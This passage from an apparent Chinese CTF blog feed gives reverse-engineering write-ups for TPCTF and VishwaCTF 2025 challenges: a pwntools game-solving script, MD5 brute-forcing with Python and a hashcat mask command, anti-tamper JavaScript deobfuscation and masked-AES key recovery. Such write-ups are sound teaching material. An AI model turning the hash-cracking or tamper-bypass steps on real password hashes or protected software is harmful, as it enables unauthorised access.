%E6%9D%82%E7%9A%84%E5%8A%9E%E6%B3%95%EF%BC%8C%E5%B0%B1%E6%98%AF%E6%AF%8F%E4%B8%80%E8%BD%AE%E5%BC%80%E5%A7%8B%EF%BC%8C%E9%83%BD%E7%9B%B4%E6%8E%A5%E6%8A%8A%E5%89%8D%E5%9B%9B%E5%A0%86%E7%9A%84%E7%9F%B3%E5%A4%B4%E5%85%A8%E9%83%A8%E7%A7%BB%E5%AE%8C%EF%BC%8C%E7%84%B6%E5%90%8EAI%E4%BC%9A%E5%9C%A8%E5%89%A9%E4%B8%8B%E4%B8%89%E5%A0%86%E4%B8%AD%E4%BB%BB%E6%84%8F%E9%80%89%E4%B8%80%E5%A0%86%E4%B8%80%E5%8F%A3%E6%B0%94%E7%A7%BB%E5%AE%8C%EF%BC%88%E5%88%AB%E9%97%AE%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E4%BB%96%E7%AE%97%E6%B3%95%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B9%88%E5%86%99%E7%9A%84%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E7%AC%AC%E4%BA%8C%E6%89%8B%E6%88%91%E4%BB%AC%E6%8A%8A%E5%89%A9%E4%B8%8B%E4%B8%A4%E5%A0%86%EF%BC%88%E4%B8%8D%E4%B8%BA%E9%9B%B6%E7%9A%84%E4%B8%A4%E5%A0%86%EF%BC%89%EF%BC%8C%E5%85%A8%E9%83%A8%E7%A7%BB%E8%B5%B0n-1%E4%B8%AA%EF%BC%8Cn%E5%8D%B3%E4%B8%BA%E6%AF%8F%E5%A0%86%E7%9F%B3%E5%A4%B4%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%8C%E7%84%B6%E5%90%8EAI%E5%B0%B1%E4%BC%9A%E5%9C%A8%E8%BF%99%E4%B8%A4%E5%A0%86%E4%B8%AD%E4%BB%BB%E9%80%89%E4%B8%80%E5%A0%86%E7%A7%BB%E8%B5%B01%E4%B8%AA%EF%BC%8C%E6%88%91%E4%BB%AC%E5%86%8D%E7%A7%BB%E8%B5%B0%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E5%B0%B1win%E4%BA%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%89%8B%E5%8A%A8%E5%8E%BB%E6%89%93%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E5%8C%96%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B9%9F%E8%B4%B4%E4%B8%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC">https://pylingual.io/，但是库函数不行，但也好在这个题和python逆向没多大关系，主要还是玩游戏通关，就是移石头的益智游戏，根据测试，一次最多只能一口气移完四堆石头，否则就会报错，然后要赢100轮，可以手搓也可以pwntools写脚本自动化去打，但是也得找到一个通杀且步骤不复杂的办法，就是每一轮开始，都直接把前四堆的石头全部移完，然后AI会在剩下三堆中任意选一堆一口气移完（别问我为什么，他算法就是这么写的），然后第二手我们把剩下两堆（不为零的两堆），全部移走n-1个，n即为每堆石头的个数，然后AI就会在这两堆中任选一堆移走1个，我们再移走最后一个就win了，可以手动去打，也可以自动化，这里也贴上自动化脚本</a></p><pre><code class="language-python">from pwn import *context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)io = remote(&quot;1.95.128.179&quot;, 3845)io.sendline()for i in range(100):    io.recvuntil(b&quot;Segment 1: &quot;)    int1 = int(io.recvuntil(b&quot; &quot;))    print(int1)    io.recvuntil(b&quot;Segment 2: &quot;)    int2 = int(io.recvuntil(b&quot; &quot;))    print(int2)    io.recvuntil(b&quot;Segment 3: &quot;)    int3 = int(io.recvuntil(b&quot; &quot;))    print(int3)    io.recvuntil(b&quot;Segment 4: &quot;)    int4 = int(io.recvuntil(b&quot; &quot;))    print(int4)    io.recv()    payload = f&quot;&#123;int1&#125; &#123;int2&#125; &#123;int3&#125; &#123;int4&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125;&quot;    io.sendline(payload)    io.recvuntil(b&#39;AI is thinking...\n&#39;)    sleep(2)    io.recvuntil(b&quot;Segment 5: &quot;)    int5 = int(io.recvuntil(b&quot; &quot;))    print(int5)    io.recvuntil(b&quot;Segment 6: &quot;)    int6 = int(io.recvuntil(b&quot; &quot;))    print(int6)    io.recvuntil(b&quot;Segment 7: &quot;)    int7 = int(io.recvuntil(b&quot; &quot;))    print(int7)    if int5 == 0:        payload = f&quot;&#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;int6-1&#125; &#123;int7-1&#125;&quot;        io.sendline(payload)    elif int6 == 0:        payload = f&quot;&#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;int5-1&#125; &#123;0&#125; &#123;int7-1&#125;&quot;        io.sendline(payload)    elif int7 == 0:        payload = f&quot;&#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;int5-1&#125; &#123;int6-1&#125; &#123;0&#125;&quot;        io.sendline(payload)    io.recvuntil(b&#39;AI is thinking...\n&#39;)    sleep(2)    io.recvuntil(b&quot;Segment 5: &quot;)    int5 = int(io.recv(1),10)    print(int5)    io.recvuntil(b&quot;Segment 6: &quot;)    int6 = int(io.recv(1),10)    print(int6)    io.recvuntil(b&quot;Segment 7: &quot;)    int7 = int(io.recv(1),10)    print(int7)    if int5 == 1:        payload = f&quot;&#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;1&#125; &#123;0&#125; &#123;0&#125;&quot;        io.sendline(payload)    elif int6 == 1:        payload = f&quot;&#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;1&#125; &#123;0&#125;&quot;        io.sendline(payload)    elif int7 == 1:        payload = f&quot;&#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;0&#125; &#123;1&#125;&quot;        io.sendline(payload)    io.recvuntil(b&#39;You won this round!&#39;)    sleep(2)io.interactive()</code></pre><p>拿到flag</p><p><strong>TPCTF{M0nt3_C4rl0_S34rch_1s_4w3s0m3_f0r_g4m3s}</strong></p><hr><h3 id="magicfile"><a href="#magicfile" class="headerlink" title="magicfile"></a>magicfile</h3><p>（赛后复现）</p><p>闹麻了，纯纯misc，010editor打开，然后找到正确提示，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250310133232786.png" alt="image-20250310133232786"></p><p>然后顺着往上找，就能找到flag，每个字符是以单字节的形式存放</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250310133336843.png" alt="image-20250310133336843"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250310133407295.png" alt="image-20250310133407295"></p><p>依次类推，拿到flag</p><p><strong>TPCTF{YoU_AR3_SO_5m@R7_TO_cRACk_Th1$_m@9iC_f1le}</strong></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250310133501797.png" alt="image-20250310133501797"></p><hr><h3 id="LinuxPDF"><a href="#LinuxPDF" class="headerlink" title="LinuxPDF"></a>LinuxPDF</h3><p>可以找到项目源码，<a href="https://github.com/ading2210/linuxpdf%EF%BC%8C%E5%9C%A8pdf%E7%9A%84%E6%9C%80%E4%B8%8B%E6%96%B9">https://github.com/ading2210/linuxpdf，在pdf的最下方</a></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311135453180.png" alt="image-20250311135453180"></p><p>可以得知embeded_files是<strong>压缩+base64</strong>的结果</p><p>用vscode打开这个pdf，可以看到里面有很多base64编码，并且随便挑一个用赛博厨子解编码都可以发现确实都是zlib，因此可以写个脚本将其中所有base64都进行解码，然后zlib解压缩，完了检查其中是否有<strong>Flag</strong>字样，因为谷歌打开这个pdf会有这个提示输出，然后就可以定位到check逻辑，最后找到的文件是<strong>root&#x2F;files&#x2F;00000000000000a9</strong>，然后进行解码，接着解zlib，然后ida9.0进行反编译，其中的逻辑就是一个md5，标准的，但是在加密过程有所改变，29位的flag，第一次是完整的flag进行md5加密，然后第二次是从第二位开始进行md5加密，因此可以写一个脚本进行爆破，也可以自己一位一位hashcat进行爆破</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311104432120.png" alt="image-20250311104432120"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311104516670.png" alt="image-20250311104516670"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311104609129.png" alt="image-20250311104609129"></p><p>反编译是riscv64，所以得用ida9.0</p><pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v3; // a1  __int64 v4; // a2  puts(&quot;Flag: &quot;, argv, envp);  scanf(&quot;%29s&quot;, &amp;unk_4220);  for ( dword_4284 = 0; dword_4284 &lt;= 27LL; ++dword_4284 )    sub_2948((char *)&amp;unk_4220 + dword_4284, (char *)&amp;unk_4008 + 17 * dword_4284);  puts(&quot;Correct&quot;, v3, v4);  return 0;&#125;</code></pre><p>解密脚本</p><pre><code class="language-python">from hashlib import md5from string import printables = [0x38, 0xF8, 0x8A, 0x3B, 0xC5, 0x70, 0x21, 0x0F, 0x8A, 0x8D, 0x95, 0x58, 0x5B, 0x46, 0xB0, 0x65, 0x00, 0x83, 0x05, 0x5A, 0xE8, 0x0C, 0xDC, 0x8B, 0xD5, 0x93, 0x78, 0xB8, 0x62, 0x8D, 0x73, 0x3F, 0xCB, 0x00, 0xFA, 0x7D, 0xAF, 0xFB, 0xD7, 0xAC, 0xEC, 0x13, 0xB0, 0x69, 0x5D, 0x93, 0x5A, 0x04, 0xBC, 0x0F, 0x00, 0xC2, 0x9C, 0xC0, 0xFD, 0x38, 0x01, 0xC7, 0xFD, 0xD3, 0x15, 0xC7, 0x82, 0x99, 0x9B, 0xD4, 0xCB, 0x00, 0x2B, 0xA2, 0xD0, 0x1A, 0xF1, 0x2D, 0x9B, 0xE3, 0x1A, 0x2B, 0x44, 0x32, 0x3C, 0x1A, 0x4F, 0x47, 0x00, 0xDD, 0xEE, 0xBA, 0xF0, 0x02, 0x52, 0x7A, 0x9E, 0xAD, 0x78, 0xBD, 0x16, 0x68, 0x45, 0x73, 0xCC, 0x00, 0xBF, 0x95, 0xB8, 0x99, 0x34, 0xA1, 0xB5, 0x55, 0xE1, 0x09, 0x0F, 0xEC, 0xDF, 0xD3, 0xDA, 0x9F, 0x00, 0xB6, 0x42, 0x2C, 0x30, 0xB0, 0x29, 0x38, 0x53, 0x5F, 0x8E, 0x64, 0x8D, 0x60, 0xA8, 0x7B, 0x94, 0x00, 0x08, 0xC1, 0xB7, 0x66, 0x43, 0xAF, 0x8D, 0xD5, 0x0C, 0xB0, 0x6D, 0x7F, 0xDD, 0x3C, 0xF8, 0xED, 0x00, 0x42, 0xD6, 0x97, 0x19, 0xF9, 0x70, 0x88, 0xF0, 0x65, 0x40, 0xF4, 0x12, 0xDC, 0x17, 0x06, 0xFB, 0x00, 0xA1, 0xF2, 0x3D, 0xA6, 0x16, 0x15, 0x40, 0x0E, 0x7B, 0xD9, 0xEA, 0x72, 0xD6, 0x35, 0x67, 0xEB, 0x00, 0x4E, 0x24, 0x6F, 0x0A, 0x5D, 0xD3, 0xCE, 0x59, 0x46, 0x5F, 0xF3, 0xD0, 0x2E, 0xC4, 0xF9, 0x84, 0x00, 0xB8, 0xCF, 0x25, 0xF9, 0x63, 0xE8, 0xE9, 0xF4, 0xC3, 0xFD, 0xDA, 0x34, 0xF6, 0xF0, 0x1A, 0x35, 0x00, 0x2D, 0x98, 0xD8, 0x20, 0x83, 0x5C, 0x75, 0xA9, 0xF9, 0x81, 0xAD, 0x4D, 0xB8, 0x26, 0xBF, 0x8E, 0x00, 0x70, 0x2E, 0xAD, 0x08, 0xA3, 0xDD, 0x56, 0xB3, 0x13, 0x4C, 0x7C, 0x38, 0x41, 0xA6, 0x52, 0xAA, 0x00, 0xD2, 0xD5, 0x57, 0xB6, 0x13, 0x66, 0x2B, 0x92, 0xF3, 0x99, 0xD6, 0x12, 0xFB, 0x91, 0x59, 0x1E, 0x00, 0xE4, 0x42, 0x2B, 0x63, 0x20, 0xED, 0x98, 0x9E, 0x7E, 0x3C, 0xB9, 0x7F, 0x36, 0x9C, 0xBA, 0x38, 0x00, 0x71, 0x80, 0x35, 0x86, 0xC6, 0x70, 0x59, 0xDD, 0xA3, 0x25, 0x25, 0xCE, 0x84, 0x4C, 0x50, 0x79, 0x00, 0x83, 0xB3, 0x71, 0x80, 0x1D, 0x0A, 0xDE, 0x07, 0xB5, 0xC4, 0xF5, 0x1E, 0x8C, 0x62, 0x15, 0xE2, 0x00, 0xB0, 0xD1, 0xB4, 0x88, 0x5B, 0xC2, 0xFD, 0xC5, 0xA6, 0x65, 0x26, 0x69, 0x24, 0x48, 0x6C, 0x5F, 0x00, 0x79, 0x2C, 0x9E, 0x7F, 0x05, 0xC4, 0x07, 0xC5, 0x6F, 0x3B, 0xEC, 0x4C, 0xA7, 0xE5, 0xC1, 0x71, 0x00, 0x38, 0x55, 0xE5, 0xA5, 0xBB, 0xC1, 0xCB, 0xE1, 0x8A, 0x6E, 0xAB, 0x5D, 0xD9, 0x7C, 0x06, 0x3C, 0x00, 0x88, 0x6D, 0x45, 0xE0, 0x45, 0x1B, 0xBB, 0xA7, 0xC0, 0x34, 0x1F, 0xE9, 0x0A, 0x95, 0x4F, 0x34, 0x00, 0x3A, 0x43, 0x7C, 0xBE, 0x65, 0x91, 0xEA, 0x34, 0x89, 0x64, 0x25, 0x85, 0x6E, 0xAE, 0x7B, 0x65, 0x00, 0x34, 0x30, 0x49, 0x67, 0xA0, 0x67, 0x30, 0x8A, 0x76, 0x70, 0x1F, 0x05, 0xC0, 0x66, 0x85, 0x51, 0x00, 0xD6, 0xAF, 0x7C, 0x4F, 0xED, 0xCF, 0x2B, 0x67, 0x77, 0xDF, 0x8E, 0x83, 0xC9, 0x32, 0xF8, 0x83, 0x00, 0xDF, 0x88, 0x93, 0x1E, 0x7E, 0xEF, 0xDF, 0xCC, 0x2B, 0xB8, 0x0D, 0x4A, 0x4F, 0x57, 0x10, 0xFB, 0x00, 0xCB, 0x0F, 0xC8, 0x13, 0x75, 0x5A, 0x45, 0xCE, 0x59, 0x84, 0xBF, 0xBA, 0x15, 0x84, 0x7C, 0x1E, 0x00]flag = &quot;&#125;&quot;for j in range(len(s)-17, -1, -17):    for i in printable:        text = i + flag        if md5(text.encode()).hexdigest() == bytes(s[j:j+16]).hex():            print(text)            flag = text            break</code></pre><pre><code>hashcat.exe -a 3 -m 0 cb0fc813755a45ce5984bfba15847c1e ?a&#125;</code></pre><p>掩码爆破，?a就是任意可见字符。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311102552759.png" alt="image-20250311102552759"></p><p><strong>TPCTF{mag1c_RISC-V_linux-PDF}</strong></p><hr><h3 id="obfuscator"><a href="#obfuscator" class="headerlink" title="obfuscator"></a>obfuscator</h3><p>这题切入点就很奇怪，运行了elf，在根目录tmp文件夹里生成一个.cache文件，记事本或者010editor打开可以发现里面藏了严重混淆的js代码，提取出来，</p><pre><code class="language-js">(function Y4QD(HkYv) &#123;  const jS0v = Tr5t(    HkYv,    bIQv(Y4QD.toString())  );  try &#123;    let DfTv = eval(jS0v);    return DfTv.apply(null, Aevx);  &#125; catch (fNVv) &#123;    var zaOv = 0o203410 - 67316;    while (zaOv &lt; 0o400155 % 65575)      switch (zaOv) &#123;        case 0x3004d % 0o200023:          zaOv =            fNVv instanceof SyntaxError              ? 0o400115 % 0x1001f              : 0o400157 % 0x10028;          break;        case 0o200702 - 0x101b3:          zaOv = 0o400173 % 65582;          &#123;            console.log(&quot;Error: the code has been tampered!&quot;);            return;          &#125;          break;      &#125;    throw fNVv;  &#125;  function bIQv(bKnw) &#123;    let Dhqw = 975342312;    var XEiw = 0o400141 % 65567;    &#123;      let zclw;      while (XEiw &lt; 0x105a0 - 0o202574) &#123;        switch (XEiw) &#123;          case 0o600066 % 0x1000e:            XEiw = 68656 - 0o206026;            &#123;              Dhqw ^=                (bKnw.charCodeAt(zclw) * (15658734 ^ 0o73567354) +                  bKnw.charCodeAt(zclw &gt;&gt;&gt; (0x4a5d0ce &amp; 0o320423424))) ^                835577039;            &#125;            break;          case 0o205050 - 68110:            XEiw = 131151 % 0o200032;            zclw++;            break;          case 262303 % 0o200041:            XEiw = zclw &lt; bKnw.length ? 0o400076 % 0x10019 : 68056 - 0o204664;            break;          case 0o1000227 % 0x1001d:            XEiw = 0o203542 - 0x10747;            zclw = 0x75bcd15 - 0o726746425;            break;        &#125;      &#125;    &#125;    let Tzdw = &quot;&quot;;    var v7fw = 65836 - 0o200435;    &#123;      let Pu8v;      while (v7fw &lt; 0o600205 % 0x10022) &#123;        switch (v7fw) &#123;          case 0o600146 % 65565:            v7fw = 0x20036 % 0o200022;            Pu8v = 0x21786 % 3;            break;          case 0o200550 - 0x10156:            v7fw =              Pu8v &lt; (0o347010110 &amp; 0x463a71d)                ? 65836 - 0o200416                : 0o400151 % 0x10025;            break;          case 131158 % 0o200034:            v7fw = 73639709 % 9;            &#123;              const r2aw = Dhqw % (0x10690 - 0o203170);              Dhqw = Math.floor(Dhqw / (0o600140 % 65560));              Tzdw +=                r2aw &gt;= 0o1000136 % 0x10011                  ? String.fromCharCode(                      0o212120 - 0x1140f + (r2aw - (0o203434 - 67330))                    )                  : String.fromCharCode(0o205536 - 0x10afd + r2aw);            &#125;            break;          case 73639709 % 9:            v7fw = 67156 - 0o203102;            Pu8v++;            break;        &#125;      &#125;    &#125;    return Tzdw;  &#125;  function Tr5t(vZ7t, Pm0t) &#123;    vZ7t = decodeURI(vZ7t);    let rU2t = 0x21786 % 3;    let LhVt = &quot;&quot;;    var nPXt = 0o204622 - 0x1096f;    &#123;      let HcQt;      while (nPXt &lt; 0o200550 - 65860) &#123;        switch (nPXt) &#123;          case 0o200360 - 65764:            nPXt = 0o201010 - 66030;            &#123;              LhVt += String.fromCharCode(                vZ7t.charCodeAt(HcQt) ^ Pm0t.charCodeAt(rU2t)              );              rU2t++;              var jKSt = 0x10186 - 0o200571;              while (jKSt &lt; 0x103e8 - 0o201717)                switch (jKSt) &#123;                  case 0o600114 % 0x10015:                    jKSt =                      rU2t &gt;= Pm0t.length                        ? 0x30066 % 0o200032                        : 0o400127 % 65567;                    break;                  case 67216 - 0o203170:                    jKSt = 0o600160 % 65565;                    &#123;                      rU2t = 0x21786 % 3;                    &#125;                    break;                &#125;            &#125;            break;          case 68506 - 0o205577:            nPXt = HcQt &lt; vZ7t.length ? 0o1000164 % 65562 : 68056 - 0o204664;            break;          case 67636 - 0o204021:            nPXt = 0o1000227 % 65567;            HcQt = 0x21786 % 3;            break;          case 0x4007a % 0o200030:            nPXt = 0x3007b % 0o200040;            HcQt++;            break;        &#125;      &#125;    &#125;    return LhVt;  &#125;&#125;)</code></pre><p>后面还有很长，就不贴出来了。</p><p>然后尝试运行，发现报错提示缺少定义Aevx，定义一下</p><pre><code class="language-js">var Aevx;</code></pre><p>同时，这个js代码有反篡改的检测，通过Y4QD.toString()获取自身源码生成密钥。若函数被修改，密钥变化导致解密失败，eval执行失败时，检查错误类型。若为SyntaxError(密钥错误导致解密出来的代码有语法错误），判定为篡改，输出Error: the code has been tampered!</p><p>可以加入</p><pre><code class="language-js">console.log(Y4QD.toString());</code></pre><p>将打印出来的内容把后面</p><pre><code class="language-js">const jS0v = Tr5t(HkYv, bIQv(Y4QD.toString()));</code></pre><p>中的<strong>Y4QD.toString</strong>替换掉。</p><p>然后再在后面加上</p><pre><code class="language-js">console.log(jS0v);</code></pre><p>就拿到jS0v了。注意应该最好在编译器里运行，在终端运行好像有些字符无法输出会以_输出。</p><pre><code class="language-js">(function () &#123;    function AYnQ() &#123;        return (IqhF()) + (QIKN())    &#125;    function UTeQ() &#123;        return cypN() + AUkK() + EjQI() + EHOF() + sqiD() + glTI()    &#125;    function wVhQ() &#123;        return (sqiD())[wtgN()]()    &#125;    function QQYP() &#123;        return (+!+[] + (++[+[]][+[]])) + (+[] + !+[])    &#125;    HbGI = &#123;&#125;;    function sSbQ() &#123;        return EjQI() + ceKC() + wVhQ() + ULQN()    &#125;    function smPQ() &#123;        gJRF = [];        const UnSQ = AUsA();        const ojJQ = MxyB();        const QkMQ = seBO();        const kgDQ = wFNB();        const MhGQ = MdDK();        var gdxQ = (196698 % 0o200026); &#123;            let IeAQ;            while (gdxQ &lt; (196664 % 0o200011)) &#123;                switch (gdxQ) &#123;                case (0x102D0 - 0o201270):                    gdxQ = (262208 % 0o200014);                    IeAQ = (0x75bcd15 - 0O726746425);                    break;                case (262225 % 0o200017):                    gdxQ = (0O264353757 % 8); &#123;                        let kEBN = &quot;&quot;;                        const MFEN = QofD[IeAQ];                        var gBvN = (0o201510 - 0x1032C); &#123;                            let ICyN;                            while (gBvN &lt; (0x4009E % 0o200036)) &#123;                                switch (gBvN) &#123;                                case (0x10C4E - 0o206053):                                    gBvN = (0o1000247 % 0x10023); &#123;                                        kEBN += UnSQ[ojJQ](MFEN[QkMQ](ICyN) ^ (0O264353757 % 8));                                    &#125;                                    break;                                case (68056 - 0o204674):                                    gBvN = (0o1000301 % 0x10027);                                    ICyN = (0x21786 % 3);                                    break;                                case (262319 % 0o200045):                                    gBvN = (0o201344 - 0x102BF);                                    ICyN++;                                    break;                                case (0o600243 % 0x1002A):                                    gBvN = ICyN &lt; MFEN[kgDQ] ? (262319 % 0o200043) : (0o1000246 % 0x10020);                                    break;                                &#125;                            &#125;                        &#125;                        gJRF[MhGQ](kEBN);                    &#125;                    break;                case (0o1000104 % 65549):                    gdxQ = IeAQ &lt; QofD[kgDQ] ? (131113 % 0o200012) : (0o202652 - 66957);                    break;                case (0O264353757 % 8):                    gdxQ = (0x40058 % 0o200022);                    IeAQ++;                    break;                &#125;            &#125;        &#125;    &#125;    function cypN() &#123;        return (typeof ([] + []))[+!+[] + !+[]]    &#125;    function EzsN() &#123;        return ((+([+[            [!+[] + !+[]] + [+[]]        ]] + [])[+[            [+[                [+[]] + [+[]]            ] + []][+[]][+!+[]]        ]]) * (orfJ())) + (+[            [+[                [+!+[]] + [+[]]            ] + []][+[]][+!+[]]        ])    &#125;    function YujN() &#123;        return (AILL())[kYoO()](AoYK())    &#125;    function AwmN() &#123;        return EbCG() + MVoI() + EvpH() + EjQI()    &#125;    function AQZN() &#123;        return oPdG() + kMXF() + kwnL() + wNTN()    &#125;    HbGI.t = ([null] == &#39;&#39;);    function cScO() &#123;        return ([][gViO()] + [])[cWnK()]    &#125;    function wNTN() &#123;        return (EvpH())[wtgN()]()    &#125;    function YOWN() &#123;        return (AQhE())[wtgN()]()    &#125;    function sKNN() &#123;        return cypN() + oPdG() + YiSE() + wNTN() + oPdG() + kMXF() + kwnL() + wNTN()    &#125;    function ULQN() &#123;        return (AUkK())[wtgN()]()    &#125;    function oHHN() &#123;        return function () &#123;&#125;;    &#125;    function QIKN() &#123;        return (UrdN()) + (sCHB())    &#125;    var QcyO = [(263359 % 0o200361), (86096 - 0o247517), (0x2935494a % 7), (0x20451009 % 9)];    function seBO() &#123;        return gtpB() + UbBI() + AUkK() + cypN() + kwnL() + sqiD() + EHOF() + AsjH() + ULQN() + cOZH() + wVpG()    &#125;    function MZrO() &#123;        return (++[+[]][+[]]) + ((QQYP()) * (+([+[            [!+[] + !+[]] + [+[]]        ]] + [])[+[            [+[                [+[]] + [+[]]            ] + []][+[]][+!+[]]        ]]))    &#125;    function obvO() &#123;        return UXxC() + EHOF() + EDDJ() + wNTN()    &#125;    function IWlO() &#123;        return gZtK() + EHOF() + EHOF() + ofGK() + IaxK() + kAyH() + ETfO() + EDDJ()    &#125;    function kYoO() &#123;        return wVpG() + sqiD() + QoXM() + wVpG() + cypN() + MVoI() + EjQI() + EvpH()    &#125;    function ETfO() &#123;        return (IGJJ()) + []    &#125;    function gViO() &#123;        return AQhE() + MVoI() + EjQI() + EHOF()    &#125;    var gpWO = [(0o217620 - 0x11F2B), (0x3015A % 0o200121), (0o400345 % 65597), (0o216716 - 73057), (73446 - 0o217165)];    function IqZO(cmQO, EnTO, YiKO) &#123;        let AkNO = &quot;&quot;;        var UfEO = (0o205120 - 0x10A3A); &#123;            let whHO;            YWkQ: while (UfEO &lt; (0x10E74 - 0o207117)) &#123;                switch (UfEO) &#123;                case (0o400136 % 0x1001D):                    UfEO = (0o400124 % 65561); &#123;                        var YGIL = (262237 % 0o200017);                        while (YGIL &lt; (131179 % 0o200043)) switch (YGIL) &#123;                        case (66616 - 0o202024):                            YGIL = (0x20075 % 0o200050);                            break YWkQ;                        case (0o400075 % 0x1000E):                            YGIL = whHO &gt;= cmQO.length ? (0x400B4 % 0o200044) : (0x1073A - 0o203425);                            break;                        &#125;                        AkNO += cmQO[whHO];                    &#125;                    break;                case (0o600074 % 0x10009):                    UfEO = whHO &lt; EnTO + (YiKO === undefined ? cmQO.length : YiKO) ? (196737 % 0o200037) : (0x11158 - 0o210463);                    break;                case (0o205240 - 68222):                    UfEO = (0x3005D % 0o200024);                    whHO++;                    break;                case (0o205120 - 68154):                    UfEO = (0x107BC - 0o203633);                    whHO = EnTO;                    break;                &#125;            &#125;        &#125;        return AkNO;    &#125;</code></pre><p>后面还很长，就不贴出来了。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311212616259.png" alt="image-20250311212616259"></p><p>这个js将被混淆的字符串QofD解混淆成为字符串gJRF。然后在代码的后半段下个断点，调试就能提取到。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311212828711.png" alt="image-20250311212828711"></p><p>右键复制值，提取出来</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311212913596.png" alt="image-20250311212913596"></p><p>可以看到有大量的base64编码结果，赛博厨子解码一下，然后识别出是gzip压缩，解压缩一下</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311213001529.png" alt="image-20250311213001529"></p><p>解压缩后发现是wasm</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311213024199.png" alt="image-20250311213024199"></p><p>下载下来。binwalk发现有AES加密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311213244008.png" alt="image-20250311213244008"></p><p>然后也尝试过编译成.c，但是也还是没分析出什么，最后010打开，搜Flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250311213534042.png" alt="image-20250311213534042"></p><p>看到密文，key，iv，以及一个mask，上网搜索之后知道这是带mas掩码的AES加密，把key和iv分别和这个mask异或之后，再CBC模式解AES即可。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/7cb32bd85a16d0a96f9c120cd40a131.png" alt="7cb32bd85a16d0a96f9c120cd40a131"></p><p>拿到flag：<strong>TPCTF{m47r3shk4_h4ppy_r3v3r53_g@_w45m}</strong></p><p>—————————————本题参照SU两位师傅写的wp复现写的wp—————————-</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VishwaCTF2025</title>
      <link href="/2025/03/06/VishwaCTF2025/"/>
      <url>/2025/03/06/VishwaCTF2025/</url>
      
        <content type="html"><![CDATA[<h1 id="VishwaCTF2025"><a href="#VishwaCTF2025" class="headerlink" title="VishwaCTF2025"></a>VishwaCTF2025</h1><h3 id="Hungry-Friends"><a href="#Hungry-Friends" class="headerlink" title="Hungry Friends"></a>Hungry Friends</h3><p>就是一个贪吃蛇游戏，但是运行不了，就算找到了提示所缺的dll，也没用，所以patch没用，只能硬扒代码下来跑，但是一开始解密的数据找不到，然后交叉引用encrypted，就找到了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250304215107724.png" alt="image-20250304215107724"></p><p>外面显示的是38位，但是进去之后用插件提数据只提到37位qword，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250304215217263.png" alt="image-20250304215217263"></p><p>然后仿写个脚本出</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;// 解密函数void decrypt(uint64_t *data, size_t data_size, char *output) &#123;    uint32_t v13 = 0xF96007CB; // 初始密钥    for (size_t i = 0; i &lt; data_size; i++) &#123;        uint64_t v11 = data[i]; // 当前数据块        // 解密逻辑        output[i] = (char)((v11 - (v13 ^ (1337 * i))) / 0x11);        // 更新密钥        v13 ^= (uint32_t)v11; // 确保 v13 是 32 位    &#125;    output[data_size] = &#39;\0&#39;; // 字符串结尾&#125;int main() &#123;    // 示例数据（需要解密的数据块）    uint64_t data[] = &#123;        0xF9600D81, 0x166C, 0x1DF7, 0x1562,         0x083E, 0x0D01, 0x134D, 0x2BE2,         0x0591, 0x0BDE, 0x1B0A, 0x0BFD,         0x0C9A, 0x8076, 0xF5CC, 0x073B,         0x1D84, 0x145F, 0x21BC, 0x092B,         0x043D, 0x08AA, 0x1A31, 0x0D90,         0x1205, 0xE6F3, 0x0715, 0x138B,         0x08DA, 0x1369, 0x1ADE, 0x368C,         0x0AE5, 0x05FF, 0x22C0, 0x46B0,         0x79C1    &#125;;    size_t data_size = sizeof(data) / sizeof(data[0]);    // 分配输出缓冲区    char *output = (char 